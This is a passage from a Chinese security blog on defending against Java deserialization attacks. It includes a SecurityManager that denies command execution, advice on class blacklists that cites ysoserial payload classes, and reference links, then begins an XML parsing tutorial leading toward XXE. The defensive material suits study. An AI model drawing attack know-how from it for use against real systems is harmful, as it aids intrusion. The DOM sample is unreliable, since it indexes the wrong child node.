class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">SecurityManager originalSecurityManager = System.getSecurityManager();</span><br><span class="line">        <span class="keyword">if</span> (originalSecurityManager == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 创建自己的SecurityManager</span></span><br><span class="line">            SecurityManager sm = <span class="keyword">new</span> SecurityManager() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">check</span><span class="params">(Permission perm)</span> </span>&#123;</span><br><span class="line">                    <span class="comment">// 禁止exec</span></span><br><span class="line">                    <span class="keyword">if</span> (perm <span class="keyword">instanceof</span> java.io.FilePermission) &#123;</span><br><span class="line">                        String actions = perm.getActions();</span><br><span class="line">                        <span class="keyword">if</span> (actions != <span class="keyword">null</span> &amp;&amp; actions.contains(<span class="string">"execute"</span>)) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> SecurityException(<span class="string">"execute denied!"</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 禁止设置新的SecurityManager，保护自己</span></span><br><span class="line">                    <span class="keyword">if</span> (perm <span class="keyword">instanceof</span> java.lang.RuntimePermission) &#123;</span><br><span class="line">                        String name = perm.getName();</span><br><span class="line">                        <span class="keyword">if</span> (name != <span class="keyword">null</span> &amp;&amp; name.contains(<span class="string">"setSecurityManager"</span>)) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> SecurityException(<span class="string">"System.setSecurityManager denied!"</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkPermission</span><span class="params">(Permission perm)</span> </span>&#123;</span><br><span class="line">                    check(perm);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkPermission</span><span class="params">(Permission perm, Object context)</span> </span>&#123;</span><br><span class="line">                    check(perm);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            System.setSecurityManager(sm);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h4 id="不建议使用的黑名单"><a href="#不建议使用的黑名单" class="headerlink" title="不建议使用的黑名单"></a>不建议使用的黑名单</h4><h5 id="在反序列化时设置类的黑名单来防御反序列化漏洞利用及攻击，这个做法在源代码修复的时候并不是推荐的方法，因为你不能保证能覆盖所有可能的类，而且有新的利用payload出来时也需要随之更新黑名单，但有一种场景下可能黑名单是一个不错的选择。写代码的时候总会把一些经常用到的方法封装到公共类，这样其它工程中用到只需要导入jar包即可，此前已经见到很多提供反序列化操作的公共接口，使用第三方库反序列化接口就不好用白名单的方式来修复了。这个时候作为第三方库也不知道谁会调用接口，会反序列化什么类，所以这个时候可以使用黑名单的方式来禁止一些已知危险的类被反序列化，具体的黑名单类可参考contrast-rO0、ysoserial中paylaod包含的类。"><a href="#在反序列化时设置类的黑名单来防御反序列化漏洞利用及攻击，这个做法在源代码修复的时候并不是推荐的方法，因为你不能保证能覆盖所有可能的类，而且有新的利用payload出来时也需要随之更新黑名单，但有一种场景下可能黑名单是一个不错的选择。写代码的时候总会把一些经常用到的方法封装到公共类，这样其它工程中用到只需要导入jar包即可，此前已经见到很多提供反序列化操作的公共接口，使用第三方库反序列化接口就不好用白名单的方式来修复了。这个时候作为第三方库也不知道谁会调用接口，会反序列化什么类，所以这个时候可以使用黑名单的方式来禁止一些已知危险的类被反序列化，具体的黑名单类可参考contrast-rO0、ysoserial中paylaod包含的类。" class="headerlink" title="在反序列化时设置类的黑名单来防御反序列化漏洞利用及攻击，这个做法在源代码修复的时候并不是推荐的方法，因为你不能保证能覆盖所有可能的类，而且有新的利用payload出来时也需要随之更新黑名单，但有一种场景下可能黑名单是一个不错的选择。写代码的时候总会把一些经常用到的方法封装到公共类，这样其它工程中用到只需要导入jar包即可，此前已经见到很多提供反序列化操作的公共接口，使用第三方库反序列化接口就不好用白名单的方式来修复了。这个时候作为第三方库也不知道谁会调用接口，会反序列化什么类，所以这个时候可以使用黑名单的方式来禁止一些已知危险的类被反序列化，具体的黑名单类可参考contrast-rO0、ysoserial中paylaod包含的类。"></a>在反序列化时设置类的黑名单来防御反序列化漏洞利用及攻击，这个做法在源代码修复的时候并不是推荐的方法，因为你不能保证能覆盖所有可能的类，而且有新的利用payload出来时也需要随之更新黑名单，但有一种场景下可能黑名单是一个不错的选择。写代码的时候总会把一些经常用到的方法封装到公共类，这样其它工程中用到只需要导入jar包即可，此前已经见到很多提供反序列化操作的公共接口，使用第三方库反序列化接口就不好用白名单的方式来修复了。这个时候作为第三方库也不知道谁会调用接口，会反序列化什么类，所以这个时候可以使用黑名单的方式来禁止一些已知危险的类被反序列化，具体的黑名单类可参考contrast-rO0、ysoserial中paylaod包含的类。</h5><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><h5 id="感觉在实战中遇到的Java站点越来越多，Java反序列化漏洞的利用也愈发显得重要。除了常见的Web服务反序列化，安卓、桌面应用、中间件、工控组件等等的反序列化。以及XML（前一阵的Weblogic挖矿事件就是XMLDecoder引起的Java反序列化）、JSON、RMI等细致化的分类。"><a href="#感觉在实战中遇到的Java站点越来越多，Java反序列化漏洞的利用也愈发显得重要。除了常见的Web服务反序列化，安卓、桌面应用、中间件、工控组件等等的反序列化。以及XML（前一阵的Weblogic挖矿事件就是XMLDecoder引起的Java反序列化）、JSON、RMI等细致化的分类。" class="headerlink" title="感觉在实战中遇到的Java站点越来越多，Java反序列化漏洞的利用也愈发显得重要。除了常见的Web服务反序列化，安卓、桌面应用、中间件、工控组件等等的反序列化。以及XML（前一阵的Weblogic挖矿事件就是XMLDecoder引起的Java反序列化）、JSON、RMI等细致化的分类。"></a>感觉在实战中遇到的Java站点越来越多，Java反序列化漏洞的利用也愈发显得重要。除了常见的Web服务反序列化，安卓、桌面应用、中间件、工控组件等等的反序列化。以及XML（前一阵的Weblogic挖矿事件就是XMLDecoder引起的Java反序列化）、JSON、RMI等细致化的分类。</h5><h5 id="代码审计及渗透测试过程中可以翻阅我翻译的一份Java反序列化漏洞备忘单，里面集合了目前关于Java反序列化研究的大会PPT、PDF文档、测试代码，以及权威组织发布的漏洞研究报告，还有被反序列化攻破的应用清单（附带POC）。"><a href="#代码审计及渗透测试过程中可以翻阅我翻译的一份Java反序列化漏洞备忘单，里面集合了目前关于Java反序列化研究的大会PPT、PDF文档、测试代码，以及权威组织发布的漏洞研究报告，还有被反序列化攻破的应用清单（附带POC）。" class="headerlink" title="代码审计及渗透测试过程中可以翻阅我翻译的一份Java反序列化漏洞备忘单，里面集合了目前关于Java反序列化研究的大会PPT、PDF文档、测试代码，以及权威组织发布的漏洞研究报告，还有被反序列化攻破的应用清单（附带POC）。"></a>代码审计及渗透测试过程中可以翻阅我翻译的一份<a href="https://xianzhi.aliyun.com/forum/topic/2042" target="_blank" rel="noopener">Java反序列化漏洞备忘单</a>，里面集合了目前关于Java反序列化研究的大会PPT、PDF文档、测试代码，以及权威组织发布的漏洞研究报告，还有被反序列化攻破的应用清单（附带POC）。</h5><h5 id="这着实是一个庞大的知识体系，笔者目前功力较浅，希望日后还能和各位师傅一起讨论、学习。"><a href="#这着实是一个庞大的知识体系，笔者目前功力较浅，希望日后还能和各位师傅一起讨论、学习。" class="headerlink" title="这着实是一个庞大的知识体系，笔者目前功力较浅，希望日后还能和各位师傅一起讨论、学习。"></a>这着实是一个庞大的知识体系，笔者目前功力较浅，希望日后还能和各位师傅一起讨论、学习。</h5><h5 id="防御部分的代码不是我自己写的，而且有些是参考人家的。"><a href="#防御部分的代码不是我自己写的，而且有些是参考人家的。" class="headerlink" title="防御部分的代码不是我自己写的，而且有些是参考人家的。"></a>防御部分的代码不是我自己写的，而且有些是参考人家的。</h5><h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><h5 id="反序列化原理—http-www-hollischuang-com-archives-1140"><a href="#反序列化原理—http-www-hollischuang-com-archives-1140" class="headerlink" title="反序列化原理—http://www.hollischuang.com/archives/1140"></a><a href="http://www.hollischuang.com/archives/1140" target="_blank" rel="noopener">反序列化原理—http://www.hollischuang.com/archives/1140</a></h5><h5 id="深入理解JAVA反序列化漏洞—https-paper-seebug-org-312"><a href="#深入理解JAVA反序列化漏洞—https-paper-seebug-org-312" class="headerlink" title="深入理解JAVA反序列化漏洞—https://paper.seebug.org/312/"></a><a href="https://paper.seebug.org/312/" target="_blank" rel="noopener">深入理解JAVA反序列化漏洞—https://paper.seebug.org/312/</a></h5><h5 id="Attacking-Java-Deserialization—-https-nickbloor-co-uk-2017-08-13-attacking-java-deserialization"><a href="#Attacking-Java-Deserialization—-https-nickbloor-co-uk-2017-08-13-attacking-java-deserialization" class="headerlink" title="Attacking Java Deserialization— https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/"></a><a href="https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/" target="_blank" rel="noopener">Attacking Java Deserialization— https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/</a></h5><h5 id="java反序列化工具ysoserial分析—http-drops-xmd5-com-static-drops-papers-14317-html"><a href="#java反序列化工具ysoserial分析—http-drops-xmd5-com-static-drops-papers-14317-html" class="headerlink" title="java反序列化工具ysoserial分析—http://drops.xmd5.com/static/drops/papers-14317.html"></a><a href="http://drops.xmd5.com/static/drops/papers-14317.html" target="_blank" rel="noopener">java反序列化工具ysoserial分析—http://drops.xmd5.com/static/drops/papers-14317.html</a></h5><h5 id="JAVA反序列化漏洞之殇（防御部分代码作者）—https-github-com-Cryin-Paper-blob-master-E5-BA-94-E7-94-A8-E5-AE-89-E5-85-A8-JAVA-E5-8F-8D-E5-BA-8F-E5-88-97-E5-8C-96-E6-BC-8F-E6-B4-9E-E4-B9-8B-E6-AE-87-md"><a href="#JAVA反序列化漏洞之殇（防御部分代码作者）—https-github-com-Cryin-Paper-blob-master-E5-BA-94-E7-94-A8-E5-AE-89-E5-85-A8-JAVA-E5-8F-8D-E5-BA-8F-E5-88-97-E5-8C-96-E6-BC-8F-E6-B4-9E-E4-B9-8B-E6-AE-87-md" class="headerlink" title="JAVA反序列化漏洞之殇（防御部分代码作者）—https://github.com/Cryin/Paper/blob/master/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8:JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%AE%87.md"></a><a href="https://github.com/Cryin/Paper/blob/master/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8:JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%AE%87.md" target="_blank" rel="noopener">JAVA反序列化漏洞之殇（防御部分代码作者）—https://github.com/Cryin/Paper/blob/master/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8:JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%AE%87.md</a></h5><h5 id="breenmachine师傅的分析—https-foxglovesecurity-com-2015-11-06-what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability"><a href="#breenmachine师傅的分析—https-foxglovesecurity-com-2015-11-06-what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability" class="headerlink" title="breenmachine师傅的分析—https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/"></a><a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/" target="_blank" rel="noopener">breenmachine师傅的分析—https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/</a></h5><h5 id="Lib之过？Java反序列化漏洞通用利用分析—https-blog-chaitin-cn-2015-11-11-java-unserialize-rce"><a href="#Lib之过？Java反序列化漏洞通用利用分析—https-blog-chaitin-cn-2015-11-11-java-unserialize-rce" class="headerlink" title="Lib之过？Java反序列化漏洞通用利用分析—https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/"></a><a href="https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/" target="_blank" rel="noopener">Lib之过？Java反序列化漏洞通用利用分析—https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/</a></h5><h4 id="java操作xml的几种方式"><a href="#java操作xml的几种方式" class="headerlink" title="java操作xml的几种方式"></a>java操作xml的几种方式</h4><h5 id="我们要解析的xml格式如下："><a href="#我们要解析的xml格式如下：" class="headerlink" title="我们要解析的xml格式如下："></a>我们要解析的xml格式如下：</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bookstore</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">book</span> <span class="attr">id</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>冰与火之歌<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">author</span>&gt;</span>乔治马丁<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">year</span>&gt;</span>2014<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">price</span>&gt;</span>89<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">book</span> <span class="attr">id</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>安徒生童话<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">year</span>&gt;</span>2004<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">price</span>&gt;</span>77<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">language</span>&gt;</span>English<span class="tag">&lt;/<span class="name">language</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bookstore</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="我们可以看到xml的存储结构就是传统的树状结构。"><a href="#我们可以看到xml的存储结构就是传统的树状结构。" class="headerlink" title="我们可以看到xml的存储结构就是传统的树状结构。"></a>我们可以看到xml的存储结构就是传统的树状结构。</h4><h5 id="我们之所以要用xml是由于跨平台传输。"><a href="#我们之所以要用xml是由于跨平台传输。" class="headerlink" title="我们之所以要用xml是由于跨平台传输。"></a>我们之所以要用xml是由于跨平台传输。</h5><h4 id="下面我们开始解析xml为了xxe做铺垫。"><a href="#下面我们开始解析xml为了xxe做铺垫。" class="headerlink" title="下面我们开始解析xml为了xxe做铺垫。"></a>下面我们开始解析xml为了xxe做铺垫。</h4><h5 id="0x1-应用DOM方式解析XML"><a href="#0x1-应用DOM方式解析XML" class="headerlink" title="0x1 应用DOM方式解析XML"></a>0x1 应用DOM方式解析XML</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.unctf.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilder;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.ParserConfigurationException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Document;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.NamedNodeMap;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Node;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.NodeList;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.SAXException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test3</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// 创建一个dom工厂对象</span></span><br><span class="line">		DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">			<span class="comment">// 通过DocumentBuilder对象中的parse方法加载books.xml</span></span><br><span class="line">			Document document = db.parse(<span class="string">"./src/com/unctf/demo/Book.xml"</span>);</span><br><span class="line">			<span class="comment">// 获取nodeList的所有book结点</span></span><br><span class="line">			NodeList bookList = document.getElementsByTagName(<span class="string">"book"</span>);</span><br><span class="line">			<span class="comment">// 获取节点的长度</span></span><br><span class="line">			System.out.println(<span class="string">"一共有"</span> + bookList.getLength() + <span class="string">"本书"</span>);</span><br><span class="line">			<span class="comment">// 开始遍历节点</span></span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; bookList.getLength(); i++) &#123;</span><br><span class="line">				Node book = bookList.item(i);</span><br><span class="line">				<span class="comment">// 每个节点的map属性</span></span><br><span class="line">				NamedNodeMap attrs = book.getAttributes();</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; attrs.getLength(); j++) &#123;</span><br><span class="line">					Node attr = attrs.item(j);</span><br><span class="line">					System.out.println(<span class="string">"属性名："</span> + attr.getNodeName());</span><br><span class="line">					System.out.println(<span class="string">"属性值："</span> + attr.getNodeValue());</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">				</span><br><span class="line">				<span class="comment">// 解析nodelist的子节点</span></span><br><span class="line">				NodeList childNodes = book.getChildNodes();</span><br><span class="line">				System.out.println(<span class="string">"第"</span> + (i + <span class="number">1</span>) + <span class="string">"本书共有"</span> + childNodes.getLength() + <span class="string">"个子节点"</span>);</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; childNodes.getLength(); k++) &#123;</span><br><span class="line">					<span class="comment">// 区分出text类型的node和element类型的node</span></span><br><span class="line">					<span class="keyword">if</span> (childNodes.item(k).getNodeType() == Node.ELEMENT_NODE) &#123;</span><br><span class="line">						<span class="comment">// 获取了element类型节点的节点名</span></span><br><span class="line">						System.out.print(<span class="string">"第"</span> + (k + <span class="number">1</span>) + <span class="string">"个节点的节点名： "</span> + childNodes.item(i).getNodeName());</span><br><span class="line">						System.out.println(<span class="string">"--节点值是："</span> + childNodes.item(k).getFirstChild().getNodeValue());</span><br><span class="line">					&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">						System.out.println(<span class="string">"--节点值是："</span> + childNodes.item(k).getTextContent());</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125; <span class="keyword">catch</span> (ParserConfigurationException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; <span class="keyword">catch</span> (SAXException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="直接运行一下明显的看到解析出所有的节点。"><a href="#直接运行一下明显的看到解析出所有的节点。" class="headerlink" title="直接运行一下明显的看到解析出所有的节点。"></a>直接运行一下明显的看到解析出所有的节点。</h5><h4 id="DOM解析会将整个xml文件加载到内存中吗，然后逐个解析"><a href="#DOM解析会将整个xml文件加载到内存中吗，然后逐个解析" class="headerlink" title="DOM解析会将整个xml文件加载到内存中吗，然后逐个解析"></a>DOM解析会将整个xml文件加载到内存中吗，然后逐个解析</h4><h5 id="Sax解析是通过handler处理类逐个进行解析每个节点"><a href="#Sax解析是通过handler处理类逐个进行解析每个节点" class="headerlink" title="Sax解析是通过handler处理类逐个进行解析每个节点"></a>Sax解析是通过handler处理类逐个进行解析每个节点</h5><h6 id="在处理DOM的时候，我们需要读入整个的XML文档，然后在内存中创建DOM树，生成DOM树上的每个NODE对象。当文档比较小的时候，这不会造成什么问题，但是一旦文档大起来，处理DOM就会变得相当费时费力。特别是其对于内存的需求，也将是成倍的增长，以至于在某些应用中使用DOM是一件很不划算的事。这时候，一个较好的替代解决方法就是SAX。-SAX在概念上与DOM完全不同。首先，不同于DOM的文档驱动，它是事件驱动的，也就是说，它并不需要读入整个文档，而文档的读入过程也就是SAX的解析过程。所谓事件驱动，是指一种基于回调（callback）机制的程序运行方法。在XMLReader接受XML文档，在读入XML文档的过程中就进行解析，也就是说读入文档的过程和解析的过程是同时进行的，这和DOM区别很大。"><a href="#在处理DOM的时候，我们需要读入整个的XML文档，然后在内存中创建DOM树，生成DOM树上的每个NODE对象。当文档比较小的时候，这不会造成什么问题，但是一旦文档大起来，处理DOM就会变得相当费时费力。特别是其对于内存的需求，也将是成倍的增长，以至于在某些应用中使用DOM是一件很不划算的事。这时候，一个较好的替代解决方法就是SAX。-SAX在概念上与DOM完全不同。首先，不同于DOM的文档驱动，它是事件驱动的，也就是说，它并不需要读入整个文档，而文档的读入过程也就是SAX的解析过程。所谓事件驱动，是指一种基于回调（callback）机制的程序运行方法。在XMLReader接受XML文档，在读入XML文档的过程中就进行解析，也就是说读入文档的过程和解析的过程是同时进行的，这和DOM区别很大。" class="headerlink" title="在处理DOM的时候，我们需要读入整个的XML文档，然后在内存中创建DOM树，生成DOM树上的每个NODE对象。当文档比较小的时候，这不会造成什么问题，但是一旦文档大起来，处理DOM就会变得相当费时费力。特别是其对于内存的需求，也将是成倍的增长，以至于在某些应用中使用DOM是一件很不划算的事。这时候，一个较好的替代解决方法就是SAX。 SAX在概念上与DOM完全不同。首先，不同于DOM的文档驱动，它是事件驱动的，也就是说，它并不需要读入整个文档，而文档的读入过程也就是SAX的解析过程。所谓事件驱动，是指一种基于回调（callback）机制的程序运行方法。在XMLReader接受XML文档，在读入XML文档的过程中就进行解析，也就是说读入文档的过程和解析的过程是同时进行的，这和DOM区别很大。"></a>在处理DOM的时候，我们需要读入整个的XML文档，然后在内存中创建DOM树，生成DOM树上的每个NODE对象。当文档比较小的时候，这不会造成什么问题，但是一旦文档大起来，处理DOM就会变得相当费时费力。特别是其对于内存的需求，也将是成倍的增长，以至于在某些应用中使用DOM是一件很不划算的事。这时候，一个较好的替代解决方法就是SAX。 SAX在概念上与DOM完全不同。首先，不同于DOM的文档驱动，它是事件驱动的，也就是说，它并不需要读入整个文档，而文档的读入过程也就是SAX的解析过程。所谓事件驱动，是指一种基于回调（callback）机制的程序运行方法。在XMLReader接受XML文档，在读入XML文档的过程中就进行解析，也就是说读入文档的过程和解析的过程是同时进行的，这和DOM区别很大。</h6><p><img src="https://user-gold-cdn.xitu.io/2019/5/15/16abb5947cce6154?imageslim" alt></p>
<p><img src="https://user-gold-cdn.xitu.io/2019/5/15/16abb597cbf6f417?imageslim" alt></p>
<h4 id="代码示例Book实体类"><a href="#代码示例Book实体类" class="headerlink" title="代码示例Book实体类"></a>代码示例Book实体类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.unctf.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Book</span> </span>&#123;</span><br><span class="line">	String name;</span><br><span class="line">	String author;</span><br><span class="line">	String price;</span><br><span class="line">	<span class="keyword">int</span> age;</span><br><span class="line">	String title;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Book</span><span class="params">(String name, String author, String price, <span class="keyword">int</span> age, String title)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>();</span><br><span class="line">		<span class="keyword">this</span>.name = name;</span><br><span class="line">		<span class="keyword">this</span>.author = author;</span><br><span class="line">		<span class="keyword">this</span>.price = price;</span><br><span class="line">		<span class="keyword">this</span>.age = age;</span><br><span class="line">		<span class="keyword">this</span>.title = title;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Book</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.name = name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getAuthor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> author;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAuthor</span><span class="params">(String author)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.author = author;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span 